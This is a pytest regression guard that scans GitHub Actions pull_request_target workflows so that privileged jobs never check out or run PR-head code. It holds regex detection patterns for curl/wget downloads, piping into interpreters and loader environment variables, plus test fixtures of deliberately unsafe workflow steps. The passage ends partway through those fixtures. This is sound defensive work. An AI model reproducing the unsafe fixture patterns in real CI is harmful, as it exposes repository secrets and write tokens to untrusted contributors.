"""Regression guard: privileged pull_request_target workflows never materialize PR-head code.

A ``pull_request_target`` job runs with base-repository privileges (secrets,
base-scoped cache writes, a token that may be write-capable). Checking out
``github.event.pull_request.head.*`` or ``refs/pull/*`` there lets a pull
request alter what that privileged job executes. PR content may only be read
as data (event fields, API responses, or git objects fetched without a
worktree); execution belongs in an unprivileged ``pull_request`` workflow.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
from pathlib import Path
from typing import Any

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = ROOT / ".github/workflows"

# Expressions or refs that name pull-request head content.
FORBIDDEN_REF = re.compile(
    r"github\.event\.pull_request\.head\.|github\.head_ref|"
    r"github\.event\.pull_request\.merge_commit_sha|refs/pull/|\bpull/[^/\s]+/(?:head|merge)\b",
)
# Exact checkout refs a pull_request_target workflow may use (whitespace
# normalized). Anything else, including literals, other repositories, bracket
# indexing, format() or step outputs, fails closed.
BASE_CHECKOUT_REFS = {
    "${{ github.event.pull_request.base.sha || github.event.merge_group.base_sha || github.sha }}",
    "${{ github.event.pull_request.base.sha }}",
}
# These resolve to the PR merge ref on pull_request/pull_request_review, so
# they are only allowed behind the non-PR-event guard below.
NON_PR_CHECKOUT_REFS = {
    "${{ github.sha }}",
    "${{ github.event.merge_group.head_sha || github.sha }}",
}
NON_PR_GUARD = '!contains(fromJSON(\'["pull_request_target","pull_request_review"]\'), github.event_name)'
MERGE_REF_EVENTS = {
    "pull_request",
    "pull_request_review",
    "pull_request_review_comment",
}
TRUSTED_REPOSITORY = "${{ github.repository }}"
BRACKET_INDEX = re.compile(r"\[\s*['\"]([\w-]+)['\"]\s*\]")
# Same-run artifacts only: these inputs pull artifacts from other runs/repos.
FOREIGN_ARTIFACT_INPUTS = {"run-id", "github-token", "repository"}
# github-script may read metadata through the API but not repository content.
SCRIPT_CONTENT_FETCH = re.compile(
    r"\b(?:getContent|getBlob|getTree|downloadTarballArchive|downloadZipballArchive|getArchive)\b"
    r"|\b(?:compareCommits|compareCommitsWithBasehead|getCommit|listFiles)\b|\bmediaType\b"
    r"|\bon\s+(?:Blob|Tree)\b|\bobject\s*\(|\bgithub\.request\b|\bfetch\("
    r"|\bhttps?\.(?:get|request)\(|pull_request\.head\b"
    r"|\b(?:downloadArtifact|downloadJobLogsForWorkflowRun|downloadWorkflowRunLogs)\b"
    r"|\brequire\(\s*['\"`](?:\.|/)"
)
# Environment variables that make a shell, git, or interpreter load code.
LOADER_ENV = re.compile(
    r"^(?:BASH_ENV|ENV|PROMPT_COMMAND|NODE_OPTIONS|LD_\w+|DYLD_\w+|GIT_\w+"
    r"|PYTHON(?:STARTUP|PATH|HOME|INSPECT|USERBASE)|PERL5OPT|PERL5LIB|RUBYOPT|RUBYLIB)$"
)
# Event payload fields an action input may use: only the exact base refs.
EVENT_EXPRESSION = re.compile(r"github\.event\.[\w.]+")
INPUT_EVENT_FIELDS = {
    "github.event.pull_request.base.sha",
    "github.event.merge_group.base_sha",
    "github.event.merge_group.head_sha",
}
# Repository metadata (name, owner, default branch) is not PR-controlled.
INPUT_EVENT_PREFIXES = ("github.event.repository.",)
DOWNLOAD_TARGET = re.compile(r"(?:^|\s)(?:-o|--output|-O)\s+[\"']?([^\s\"']+)")
URL_INSTALL = re.compile(
    r"\b(?:pip|pip3|uv\s+pip|npm|pnpm|yarn)\s+(?:install|add)\b[^\n]*\b(?:https?://|git\+)"
)
# Output of any command piped into an interpreter is executed.
PIPE_TO_INTERPRETER = re.compile(
    r"\|\s*(?:sudo\s+)?(?:\S*/)?(?:(?:ba|z|da|k)?sh|eval|source|python[\d.]*|node|perl|ruby)\b"
)
# Artifact/repository downloads from outside this run.
FOREIGN_DOWNLOAD = re.compile(
    r"(?<![\w./-])gh\s+(?:run|release)\s+download\b|(?<![\w./-])gh\s+repo\s+clone\b"
)
PINNED_ACTION = re.compile(r"^[\w.-]+/[\w./-]+@[0-9a-f]{40}$")
PUSH_ONLY_GUARD = "github.event_name == 'push'"
EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.S)
SHELL_SEPARATOR = re.compile(r"[;&|()\n`]|\$\(")
GH_CHECKOUT = re.compile(r"(?<![\w./-])gh\s+pr\s+(?:checkout|diff)\b")
# Step actions a pull_request_target job may use. Anything else could act on
# PR-head refs it receives through inherited env or the event payload, so an
# unlisted remote action fails closed; local actions are inspected instead.
ALLOWED_ACTIONS = (
    "actions/checkout@",
    "actions/github-script@",
    "actions/cache/restore@",
    "actions/cache/save@",
    "actions/upload-artifact@",
    "actions/download-artifact@",
    "actions/create-github-app-token@",
    "astral-sh/setup-uv@",
)
SCRIPT_PROCESS = re.compile(
    r"child_process|\bexec\.(?:exec|getExecOutput)\b|\bspawn(?:Sync)?\("
)
NETWORK_TOOL = re.compile(
    r"(?:^|[\s;&|(`'\"])(?:\S*/)?(?:curl|wget)\b|(?<![\w./-])gh\s+api\b"
)
# The only accepted integrity check: a literal digest piped into sha256sum.
CHECKSUM_LINE = re.compile(
    r'^\s*echo\s+"(?:\$\{?(?P<var>\w+)\}?|(?P<hex>[0-9a-f]{64}))\s+(?P<target>[^"\s]+)"\s*\|\s*sha256sum\s+-c\s+-\s*$'
)
# A script run from a trusted checkout must use isolated mode (-I): otherwise
# Python puts its directory first on sys.path and a new sibling module could
# shadow a stdlib import without changing any pinned file.
TRUSTED_SCRIPT_RUN = re.compile(
    r"(?<![\w.-])(?:\S*/)?python[\d.]*(?P<flags>(?:\s+-X\s+\S+|\s+-X\S+|\s+-\w+)*)\s+[\"']?(?:\./)?"
    r"(?P<script>(?:\.runtime-os-[\w-]+|trusted)/[^\s\"']+\.py)"
)
# Scripts the privileged jobs execute from trusted checkouts; pinned too.
PRIVILEGED_SCRIPTS = (
    "scripts/ci/runtime_os_adapter.py",
    "scripts/ci_risk_classifier.py",
    "scripts/ci_risk_classifier_core.py",
    "scripts/review_receipt_validator.py",
)
EXPRESSION_IN_BODY = re.compile(r"\$\{\{")


def _triggers(workflow: dict[Any, Any]) -> set[str]:
    # PyYAML (YAML 1.1) parses a bare ``on`` key as boolean True; GitHub reads
    # both spellings, so a workflow carrying both must be judged on their union.
    names: set[str] = set()
    for key in ("on", True):
        value = workflow.get(key)
        if isinstance(value, str):
            names.add(value)
        elif isinstance(value, list):
            names.update(str(item) for item in value)
        elif isinstance(value, dict):
            names.update(str(item) for item in value)
    return names


def _normalize(text: Any) -> str:
    """Rewrite bracket indexing (``github['event']``) to dotted form."""
    return BRACKET_INDEX.sub(r".\1", str(text))


def _forbidden(text: Any) -> bool:
    return bool(FORBIDDEN_REF.search(_normalize(text)))


def _squash(text: Any) -> str:
    return " ".join(str(text).split())


def _tainted_env(*scopes: Any) -> set[str]:
    return {
        str(name)
        for scope in scopes
        if isinstance(scope, dict)
        for name, value in (scope.get("env") or {}).items()
        if _forbidden(value)
    }


def _names_pr_ref(value: Any, tainted: set[str]) -> bool:
    """An action input names PR-head content directly or via ``${{ env.X }}``."""
    text = _normalize(value)
    if FORBIDDEN_REF.search(text):
        return True
    return any(
        re.search(rf"\benv\.{re.escape(name)}\b", expression)
        for expression in EXPRESSION.findall(text)
        for name in tainted
    )


def _shell_names_pr_ref(line: str, tainted: set[str]) -> bool:
    if _forbidden(line):
        return True
    return any(re.search(rf"\$\{{?{re.escape(name)}\b", line) for name in tainted)


def _top_level_conjuncts(expression: Any) -> list[str] | None:
    """Split an ``if:`` on top-level ``&&``; None if a top-level ``||`` exists."""
    text = _squash(expression).removeprefix("${{").removesuffix("}}").strip()
    conjuncts, depth, start, index = [], 0, 0, 0
    while index < len(text):
        char = text[index]
        if char == "'":
            # Skip a quoted string literal ('' escapes a quote inside it).
            index += 1
            while index < len(text):
                if text[index] == "'" and not text.startswith("''", index):
                    break
                index += 2 if text.startswith("''", index) else 1
            index += 1
            continue
        if char in "([":
            depth += 1
        elif char in ")]":
            depth -= 1
        elif depth == 0 and text.startswith("||", index):
            return None
        elif depth == 0 and text.startswith("&&", index):
            conjuncts.append(text[start:index].strip())
            start = index + 2
            index += 1
        index += 1
    conjuncts.append(text[start:].strip())
    return conjuncts


def _guarded(job: dict[Any, Any], step: dict[str, Any], *guards: str) -> bool:
    """True when job or step ``if`` has one of ``guards`` as a top-level conjunct."""
    for scope in (job, step):
        conjuncts = _top_level_conjuncts(scope.get("if", "")) or []
        if any(conjunct in guards for conjunct in conjuncts):
            return True
    return False


def _checkout_problems(
    workflow: dict[Any, Any], job: dict[Any, Any], step: dict[str, Any]
) -> list[str]:
    with_ = step.get("with") or {}
    problems: list[str] = []
    if "repository" in with_ and _squash(with_["repository"]) != TRUSTED_REPOSITORY:
        problems.append(f"untrusted repository={with_['repository']!r}")
    ref = _squash(with_.get("ref", "${{ github.sha }}"))
    if ref in BASE_CHECKOUT_REFS:
        return problems
    if ref not in NON_PR_CHECKOUT_REFS:
        problems.append(f"untrusted ref={with_.get('ref')!r}")
    elif _triggers(workflow) & MERGE_REF_EVENTS and not _guarded(
        job, step, NON_PR_GUARD
    ):
        problems.append(f"merge-ref-capable ref={ref!r} without the non-PR-event guard")
    return problems


# Inert git plumbing a job that reads PR refs may run, with the exact options
# each verb may take. Anything else (other verbs, other options such as
# --patch, --upload-pack, --filters, or global --work-tree/--git-dir) fails.
GIT_ALLOWED_OPTIONS = {
    "fetch": {"--no-tags", "--no-recurse-submodules", "--quiet", "-q", "--prune"},
    "cat-file": {"-e"},
    "diff": {
        "--no-ext-diff",
        "--no-textconv",
        "--name-only",
        "--name-status",
        "--no-renames",
        "-z",
    },
    "ls-files": {"-z"},
    "rev-parse": {"--verify", "-q", "--quiet"},
    "merge-base": {"--all"},
    # The exact read-only cleanliness query the receipt validator uses.
    "status": {"--porcelain=v1", "--untracked-files=all"},
}
GIT_GLOBAL_WITH_VALUE = {"-C"}
# git reached indirectly, where the verb cannot be checked statically.
INDIRECT_GIT = re.compile(
    r"(?:command\s+-v|which|type\s+-p)\s+git\b"
    r"|(?:^|[\s;&|])\w+=[\"']?(?:/[\w/.-]*/)?git[\"']?(?=[\s;&|)]|$)"
)


def _git_violations(script: str) -> list[str]:
    """Return disallowed git invocations, parsed token by token per command."""
    problems: list[str] = []
    for command in SHELL_SEPARATOR.split(script):
        tokens = [re.sub(r"[\"'\\]", "", token) for token in command.split()]
        for start, token in enumerate(tokens):
            if token in {"command", "exec", "xargs", "env", "sudo"}:
                continue
            if re.fullmatch(r"\$\{\w+:-(?:\S*/)?git\}", token):
                problems.append(f"git reached through parameter default {token}")
                break
            if token.rsplit("/", 1)[-1] != "git":
                continue
            index = start + 1
            while index < len(tokens) and tokens[index].startswith("-"):
                if tokens[index] in GIT_GLOBAL_WITH_VALUE:
                    index += 2
                elif tokens[index] == "--no-pager":
                    index += 1
                else:
                    problems.append(f"git global option {tokens[index]}")
                    index = len(tokens)
            if index >= len(tokens):
                break
            verb, args = tokens[index], tokens[index + 1 :]
            redirect = next(
                (
                    i
                    for i, arg in enumerate(args)
                    if arg[:1] in "<>" or arg[:2] in {"1>", "2>"}
                ),
                len(args),
            )
            args = args[:redirect]
            operands = [arg for arg in args if not arg.startswith("-")]
            # Operand limits: no pathspecs that could narrow what is diffed or
            # checked; fetch takes a remote and one object.
            limits = {
                "fetch": 2,
                "cat-file": 1,
                "diff": 2,
                "ls-files": 0,
                "rev-parse": 1,
                "status": 0,
                "merge-base": 2,
            }
            if verb in limits and (len(operands) > limits[verb] or "--" in args):
                problems.append(f"git {verb} with extra operands: {' '.join(args)}")
                break
            allowed = GIT_ALLOWED_OPTIONS.get(verb)
            if allowed is None:
                problems.append(f"git {verb}")
            elif any(arg.startswith("-") and arg not in allowed for arg in args):
                problems.append(f"git {verb} {' '.join(args)}")
            elif verb == "cat-file" and "-e" not in args:
                problems.append(f"git cat-file {' '.join(args)}")
            elif verb == "diff" and not {"--name-only", "--name-status"} & set(args):
                problems.append(f"git diff {' '.join(args)}")
            elif verb == "fetch" and any(":" in arg for arg in args):
                problems.append(f"git fetch refspec writes refs: {' '.join(args)}")
            break
    return problems


def _local_path(root: Path | None, uses: str) -> Path | None:
    if root is None or not uses.startswith("./"):
        return None
    return root / uses.removeprefix("./").split("@", 1)[0]


def _job_violations(
    workflow: dict[Any, Any],
    job: dict[Any, Any],
    where: str,
    root: Path | None,
    seen: set[str],
    reach: dict[str, Any] | None = None,
    entry: dict[Any, Any] | None = None,
) -> list[str]:
    # ``entry`` is the top-level pull_request_target workflow: a called
    # reusable workflow keeps the caller's triggers and github context.
    entry = workflow if entry is None else entry
    reach = {"files": set(), "checkout": False} if reach is None else reach
    violations: list[str] = []
    for key in ("container", "services"):
        if job.get(key):
            # Docker runs these images before any step is inspected.
            violations.append(f"{where} declares a job {key}")
    job_tainted = _tainted_env(workflow, job)
    uses = str(job.get("uses") or "")
    if uses:
        if _names_pr_ref(job.get("with") or {}, job_tainted):
            violations.append(
                f"{where} passes a PR-head ref to reusable workflow {uses}"
            )
        callee_path = _local_path(root, uses)
        if callee_path is None:
            # A remote reusable workflow runs in this privileged context but
            # cannot be inspected here, so it fails closed.
            violations.append(f"{where} calls uninspectable reusable workflow {uses}")
        elif str(callee_path) not in seen:
            seen.add(str(callee_path))
            reach["files"].add(callee_path)
            callee = _load(callee_path) if callee_path.is_file() else {}
            if not callee:
                violations.append(f"{where} calls missing reusable workflow {uses}")
            for callee_id, callee_job in (callee.get("jobs") or {}).items():
                if isinstance(callee_job, dict):
                    violations.extend(
                        _job_violations(
                            callee,
                            callee_job,
                            f"{where}->{uses}:{callee_id}",
                            root,
                            seen,
                            reach,
                            entry,
                        )
                    )
        return violations
    for scope_name, scope in (("workflow", workflow), ("job", job)):
        shell = ((scope.get("defaults") or {}).get("run") or {}).get("shell")
        if shell not in (None, "bash"):
            violations.append(f"{where} sets {scope_name} default shell {shell!r}")
    steps = [step for step in job.get("steps") or [] if isinstance(step, dict)]
    # Composite actions run their steps inside this job; inline local ones
    # recursively (A -> B -> checkout is as dangerous as a direct checkout).
    expanded: list[tuple[str, dict[str, Any]]] = []

    def expand(prefix: str, items: list[Any]) -> None:
        for index, step in enumerate(items):
            if not isinstance(step, dict):
                continue
            label = f"{prefix}:step[{index}] {step.get('name', step.get('uses', ''))}".rstrip()
            expanded.append((label, step))
            action_uses = str(step.get("uses") or "")
            action_dir = _local_path(root, action_uses)
            if action_uses.startswith("./") and action_dir is None:
                violations.append(
                    f"{label} uses uninspectable local action {action_uses}"
                )
            if action_dir is None or str(action_dir) in seen:
                continue
            seen.add(str(action_dir))
            manifest = next(
                (
                    action_dir / name
                    for name in ("action.yml", "action.yaml")
                    if (action_dir / name).is_file()
                ),
                None,
            )
            if manifest is None:
                violations.append(f"{label} uses missing local action {action_uses}")
                continue
            reach["files"].add(manifest)
            runs = _load(manifest).get("runs") or {}
            if runs.get("using") != "composite":
                violations.append(
                    f"{label} uses non-composite local action {action_uses}"
                )
            expand(f"{label}->", list(runs.get("steps") or []))

    expand(where, steps)
    tainted = job_tainted | _tainted_env(*(step for _, step in expanded))
    env_values: dict[str, str] = {}
    for scope in (workflow, job, *(step for _, step in expanded)):
        for name, value in (
            (scope.get("env") or {}) if isinstance(scope, dict) else {}
        ).items():
            env_values[str(name)] = (
                env_values.get(str(name), "") + " " + _normalize(value)
            )
    event_env = set()
    for name, normalized in env_values.items():
        fields = EVENT_EXPRESSION.findall(normalized)
        if re.search(r"\bgithub\.event\b(?!\.)", normalized) or any(
            field not in INPUT_EVENT_FIELDS
            and not field.startswith(INPUT_EVENT_PREFIXES)
            for field in fields
        ):
            event_env.add(name)
    # Taint flows through env-to-env indirection to a fixpoint.
    grew = True
    while grew:
        grew = False
        for name, normalized in env_values.items():
            if name not in event_env and any(
                re.search(rf"\benv\.{re.escape(other)}\b", normalized)
                for other in event_env
            ):
                event_env.add(name)
                grew = True
    for scope in (workflow, job, *(step for _, step in expanded)):
        for name, value in (
            (scope.get("env") or {}) if isinstance(scope, dict) else {}
        ).items():
            if str(value).strip().rsplit("/", 1)[-1] == "git":
                violations.append(f"{where} aliases git through env {name}")
            if LOADER_ENV.match(str(name)):
                violations.append(f"{where} sets loader environment variable {name}")
            if "$(" in str(value) or "`" in str(value):
                violations.append(f"{where} puts command substitution in env {name}")
    # The git allowlist applies to every job in a pull_request_target
    # workflow: the head SHA is always reachable through GITHUB_EVENT_PATH,
    # FETCH_HEAD, or job outputs without naming it in this job.
    for label, step in expanded:
        step_uses = str(step.get("uses") or "")
        for field, value in (step.get("with") or {}).items():
            if _names_pr_ref(value, tainted):
                violations.append(f"{label} passes {field}={value!r} to {step_uses}")
        if (
            step_uses
            and not step_uses.startswith("./")
            and not step_uses.startswith(ALLOWED_ACTIONS)
        ):
            violations.append(f"{label} uses unlisted action {step_uses}")
        if (
            step_uses
            and not step_uses.startswith("./")
            and not PINNED_ACTION.match(step_uses)
        ):
            violations.append(
                f"{label} uses action not pinned to a full commit SHA: {step_uses}"
            )
        if step_uses.startswith("actions/cache/save@") and not _guarded(
            job, step, NON_PR_GUARD, PUSH_ONLY_GUARD
        ):
            violations.append(
                f"{label} saves a cache without a push-only or non-PR guard"
            )
        for key, body in (
            ("run", step.get("run")),
            ("shell", step.get("shell")),
            (
                "script",
                (step.get("with") or {}).get("script")
                if step_uses.startswith("actions/github-script@")
                else None,
            ),
        ):
            if body is None:
                continue
            if EXPRESSION_IN_BODY.search(str(body)):
                violations.append(
                    f"{label} interpolates an expression into its {key} body; pass it through env"
                )
        if step_uses.startswith("actions/github-script@"):
            body = _normalize((step.get("with") or {}).get("script", ""))
            if SCRIPT_PROCESS.search(body):
                violations.append(f"{label} spawns processes from github-script")
            if SCRIPT_CONTENT_FETCH.search(body):
                violations.append(
                    f"{label} fetches repository content in github-script"
                )
        if step_uses.startswith("actions/download-artifact@"):
            foreign = FOREIGN_ARTIFACT_INPUTS & set(step.get("with") or {})
            if foreign:
                violations.append(
                    f"{label} downloads foreign artifacts via {sorted(foreign)}"
                )
        for field, value in (step.get("with") or {}).items():
            normalized = _normalize(value)
            for name in event_env:
                if any(
                    re.search(rf"\benv\.{re.escape(name)}\b", expression)
                    for expression in EXPRESSION.findall(normalized)
                ):
                    violations.append(
                        f"{label} feeds event-derived env.{name} into input {field}"
                    )
            if re.search(r"\bgithub\.event\b(?!\.)", normalized) or re.search(
                r"\b(?:fromJSON|toJSON)\s*\(\s*github\b", normalized
            ):
                violations.append(
                    f"{label} feeds the raw event payload into input {field}"
                )
            for expression in EVENT_EXPRESSION.findall(normalized):
                if expression not in INPUT_EVENT_FIELDS and not expression.startswith(
                    INPUT_EVENT_PREFIXES
                ):
                    violations.append(
                        f"{label} feeds event field {expression} into input {field}"
                    )
        if (
            step_uses.startswith("astral-sh/setup-uv@")
            and str((step.get("with") or {}).get("enable-cache")).lower() != "false"
        ):
            violations.append(f"{label} uses setup-uv without enable-cache: false")
        if step_uses.startswith("actions/checkout@"):
            reach["checkout"] = True
            for problem in _checkout_problems(entry, job, step):
                violations.append(f"{label} checks out {problem}")
        if step.get("shell") not in (None, "bash"):
            violations.append(f"{label} uses custom shell {step.get('shell')!r}")
        # Comments are scanned too: stripping them is not quote-aware, and a
        # false positive is cheaper than a hidden command.
        script = str(step.get("run") or "").replace("\\\n", " ")
        if not script:
            continue
        if GH_CHECKOUT.search(script):
            violations.append(f"{label} runs gh pr checkout/diff")
        if PIPE_TO_INTERPRETER.search(script) or "<(" in script:
            violations.append(f"{label} pipes command output into an interpreter")
        if URL_INSTALL.search(script):
            violations.append(f"{label} installs packages from a URL")
        for match in TRUSTED_SCRIPT_RUN.finditer(script):
            flags = [flag.removeprefix("-X") for flag in match["flags"].split()]
            if "-I" not in flags:
                violations.append(f"{label} runs {match['script']} without python -I")
            prefixes = [
                flag.split("=", 1)[1].strip("\"'")
                for flag in flags
                if flag.startswith("pycache_prefix=")
            ]
            # The prefix must be fresh per-job temp space, never the workspace.
            if not prefixes or not all(
                re.match(r"^\$\{?RUNNER_TEMP\}?/", prefix)
                and ".." not in prefix.split("/")
                for prefix in prefixes
            ):
                violations.append(
                    f"{label} runs {match['script']} without -X pycache_prefix under $RUNNER_TEMP"
                )
        if FOREIGN_DOWNLOAD.search(script):
            violations.append(
                f"{label} downloads artifacts or repositories from outside this run"
            )
        if INDIRECT_GIT.search(script):
            violations.append(f"{label} reaches git indirectly")
        for problem in _git_violations(script):
            violations.append(f"{label} runs `{problem}`")
        for line in script.splitlines():
            if NETWORK_TOOL.search(line) and _shell_names_pr_ref(line, tainted):
                violations.append(f"{label} downloads PR-head content: {line.strip()}")
        if NETWORK_TOOL.search(script):
            # Downloads must be integrity-pinned in the same step: an
            # ``echo "<digest>  <file>" | sha256sum -c -`` line whose digest is
            # a literal (or a variable assigned a literal) and that names the
            # downloaded file; the head SHA is reachable through
            # GITHUB_EVENT_PATH without naming it.
            literal_vars = set(re.findall(r"^\s*(\w+)=[0-9a-f]{64}\s*$", script, re.M))
            pinned_targets = set()
            for line in script.splitlines():
                match = CHECKSUM_LINE.match(line)
                if match and (match["hex"] or match["var"] in literal_vars):
                    pinned_targets.add(match["target"].strip("${}"))
            for line in script.splitlines():
                if "sha256sum" in line and "||" in line:
                    violations.append(f"{label} masks a sha256sum failure")
            for line in script.splitlines():
                if not NETWORK_TOOL.search(line):
                    continue
                for target in DOWNLOAD_TARGET.findall(line) or ["<stdout>"]:
                    if target.strip("${}") not in pinned_targets:
                        violations.append(
                            f"{label} downloads {target} without a sha256sum -c pin on it"
                        )
    return violations


def pull_request_target_violations(
    workflow: dict[Any, Any],
    label: str,
    root: Path | None = ROOT,
    reach: dict[str, Any] | None = None,
) -> list[str]:
    """Flag pull_request_target workflow shapes that can bring PR-head content in.

    Fail-closed allowlists rather than a deny-list, aimed at keeping only
    trusted content in the privileged workspace: checkouts must use an exact
    allowlisted ref/repository (merge-ref-capable refs only behind the non-PR
    guard); every shell ``run:`` may invoke git only as inert plumbing with
    allowlisted options, uses the default/bash shell, and may download only
    with a ``sha256sum -c`` pin; step actions come from a fixed allowlist;
    download-artifact is same-run only; github-script may neither spawn
    processes nor fetch repository content; local reusable workflows and
    composite actions are scanned recursively and remote reusable workflows
    fail closed. It inspects workflow text only, so it is a regression guard,
    not a proof of shell or interpreter semantics (commands assembled at run
    time, e.g. ``python -c`` or ``eval``, are outside what it can see).
    """
    if "pull_request_target" not in _triggers(workflow):
        return []
    violations: list[str] = []
    reach = {"files": set(), "checkout": False} if reach is None else reach
    for job_id, job in (workflow.get("jobs") or {}).items():
        if isinstance(job, dict):
            violations.extend(
                _job_violations(workflow, job, f"{label}:{job_id}", root, set(), reach)
            )
    if reach["checkout"]:
        # Checked-out base.sha is "trusted" only if it is protected history.
        on = workflow.get("on", workflow.get(True))
        target = on.get("pull_request_target") if isinstance(on, dict) else None
        branches = (target or {}).get("branches") if isinstance(target, dict) else None
        if branches != ["main"]:
            violations.append(
                f"{label} checks out code but pull_request_target is not limited to branches: [main]"
            )
    return violations


def _load(path: Path) -> dict[Any, Any]:
    return yaml.safe_load(path.read_text(encoding="utf-8")) or {}


def _workflow_files() -> list[Path]:
    return sorted([*WORKFLOWS.glob("*.yml"), *WORKFLOWS.glob("*.yaml")])


REVIEWED_FILES = Path(__file__).with_name("pull_request_target_reviewed_files.json")
# Exact text of violations knowingly tolerated while a tracked fix lands
# elsewhere; an entry fails as stale once fixed, so it cannot outlive its
# reason. Empty: the auto-arm create-github-app-token tag pin was fixed by #102.
KNOWN_VIOLATIONS: set[str] = set()


def _repository_scan() -> tuple[list[str], list[str], dict[str, str]]:
    """Scan every workflow; return PRT workflows, violations, and the sha256 of
    the files reviewed as privileged: PRT workflows, every local reusable
    workflow and composite action (with its directory) they reach, and the
    scripts the Runtime OS advisory executes from its trusted checkouts.
    Scope is pull_request_target only (not workflow_run/issue_comment)."""
    scanned: list[str] = []
    violations: list[str] = []
    files: dict[str, str] = {}
    for path in _workflow_files():
        workflow = _load(path)
        if "pull_request_target" not in _triggers(workflow):
            continue
        scanned.append(path.name)
        reach: dict[str, Any] = {"files": {path}, "checkout": False}
        violations.extend(
            pull_request_target_violations(workflow, path.name, reach=reach)
        )
        pinned_paths, symlinks = _privileged_file_set(reach["files"])
        violations.extend(
            f"{path.name}: privileged set contains a symlink: {link}"
            for link in symlinks
        )
        for reached in pinned_paths:
            relative = Path(reached).relative_to(ROOT).as_posix()
            files[relative] = hashlib.sha256(Path(reached).read_bytes()).hexdigest()
    if "ci-runtime-os-advisory.yml" in scanned:
        # The scripts the advisory executes, and this guard itself, so that
        # weakening the scanner also requires a reviewed re-pin.
        for relative in (
            *PRIVILEGED_SCRIPTS,
            "tests/ci/test_pull_request_target_safety.py",
        ):
            if _symlinked_component(ROOT / relative):
                violations.append(f"privileged set contains a symlink: {relative}")
            files[relative] = hashlib.sha256((ROOT / relative).read_bytes()).hexdigest()
    return scanned, violations, files


def _symlinked_component(path: Path, base: Path = ROOT) -> bool:
    """True when the path or any directory between ``base`` and it is a
    symlink: reading through a symlinked parent would hash and run bytes from
    an unpinned location. Paths outside ``base`` count as symlinked."""
    path = Path(os.path.abspath(path))
    try:
        parts = path.relative_to(base).parts
    except ValueError:
        return True
    current = base
    for part in parts:
        current = current / part
        if current.is_symlink():
            return True
    return False


def _privileged_file_set(
    reached: set[Any], base: Path = ROOT
) -> tuple[set[Path], list[str]]:
    """Expand reached files with every entry of each composite action's
    directory. Symlinks are reported, never followed or hashed: a link's
    target could change without changing any pinned byte."""
    paths: set[Path] = set()
    symlinks: list[str] = []
    for item in {Path(path) for path in reached}:
        candidates = [item]
        if item.name in {"action.yml", "action.yaml"}:
            # Files beside a composite action run via $GITHUB_ACTION_PATH.
            candidates.extend(item.parent.rglob("*"))
        for candidate in candidates:
            if _symlinked_component(candidate, base):
                symlinks.append(candidate.as_posix())
            elif candidate.is_file():
                paths.add(candidate)
    return paths, sorted(symlinks)


def test_no_pull_request_target_workflow_checks_out_pull_request_head() -> None:
    scanned, violations, _ = _repository_scan()
    # Not vacuous: the privileged Runtime OS advisory must still be scanned.
    assert "ci-runtime-os-advisory.yml" in scanned
    assert sorted(set(violations) - KNOWN_VIOLATIONS) == []
    assert sorted(KNOWN_VIOLATIONS - set(violations)) == [], (
        "stale KNOWN_VIOLATIONS entry"
    )


def test_no_bytecode_is_tracked() -> None:
    """A committed (unchecked-hash) .pyc beside a pinned script would run in
    place of its pinned source when loaded via spec_from_file_location."""
    import subprocess

    tracked = (
        subprocess
        .run(
            ["git", "-C", str(ROOT), "ls-files", "-z"], capture_output=True, check=True
        )
        .stdout.decode("utf-8", "surrogateescape")
        .split("\0")
    )
    bytecode = [
        path
        for path in tracked
        if path.endswith((".pyc", ".pyo")) or "__pycache__/" in path
    ]
    assert bytecode == []


def test_every_privileged_workflow_file_is_reviewed_and_pinned() -> None:
    """Closed gate: the exact bytes of every pull_request_target workflow and of
    every local reusable workflow / composite action it reaches must match a
    reviewed sha256 pin. Any edit (bodies, env, if, with, triggers, jobs) or any
    new privileged file fails until it is reviewed and re-pinned; the pattern
    rules above are defence in depth, not the gate."""
    _, _, files = _repository_scan()
    pinned = json.loads(REVIEWED_FILES.read_text(encoding="utf-8"))["files"]
    changed = {
        path: digest for path, digest in files.items() if pinned.get(path) != digest
    }
    stale = sorted(set(pinned) - set(files))
    assert changed == {}, (
        f"review these privileged files, then pin their sha256 in {REVIEWED_FILES.name}"
    )
    assert stale == [], f"remove stale pins from {REVIEWED_FILES.name}"


def _prt(steps: list[dict[str, Any]], **job: Any) -> dict[Any, Any]:
    return {
        True: {"pull_request_target": {"branches": ["main"]}},
        "jobs": {"j": {"steps": steps, **job}},
    }


def _pinned(value: Any) -> Any:
    """Pin synthetic remote actions to a full SHA so allow-cases test one rule."""
    if isinstance(value, dict):
        pinned = {key: _pinned(item) for key, item in value.items()}
        uses = pinned.get("uses")
        if isinstance(uses, str) and not uses.startswith("./") and "@" in uses:
            pinned["uses"] = uses.split("@", 1)[0] + "@" + "0" * 40
        return pinned
    if isinstance(value, list):
        return [_pinned(item) for item in value]
    return value


@pytest.mark.parametrize(
    "workflow",
    [
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {"ref": "${{ github.event.pull_request.head.sha }}"},
            }
        ]),
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {"ref": "${{ github.event.pull_request.head.ref }}"},
            }
        ]),
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {"ref": "refs/pull/${{ github.event.number }}/merge"},
            }
        ]),
        _prt([
            {"uses": "actions/checkout@v6", "with": {"ref": "${{ github.head_ref }}"}}
        ]),
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {
                    "repository": "${{ github.event.pull_request.head.repo.full_name }}"
                },
            }
        ]),
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {
                    "ref": "${{ github.event.pull_request.head.sha || github.sha }}"
                },
            }
        ]),
        _prt([{"run": "git checkout ${{ github.event.pull_request.head.sha }}"}]),
        _prt([
            {
                "run": "git fetch origin pull/1/head && git checkout FETCH_HEAD refs/pull/1/head"
            }
        ]),
        _prt([{"run": "git fetch origin pull/7/head && git checkout FETCH_HEAD"}]),
        _prt([
            {
                "env": {"HEAD": "${{ github.event.pull_request.head.sha }}"},
                "run": 'git worktree add pr "$HEAD"',
            }
        ]),
        _prt(
            [{"run": "git archive ${HEAD_SHA} | tar -x"}],
            env={"HEAD_SHA": "${{ github.event.pull_request.head.sha }}"},
        ),
        _prt([{"run": "gh pr checkout ${{ github.event.pull_request.head.ref }}"}]),
        _prt([
            {"run": "git fetch origin ${{ github.event.pull_request.head.sha }}"},
            {"run": "git checkout FETCH_HEAD && make test"},
        ]),
        _prt([
            {
                "env": {"H": "${{ github.event.pull_request.head.sha }}"},
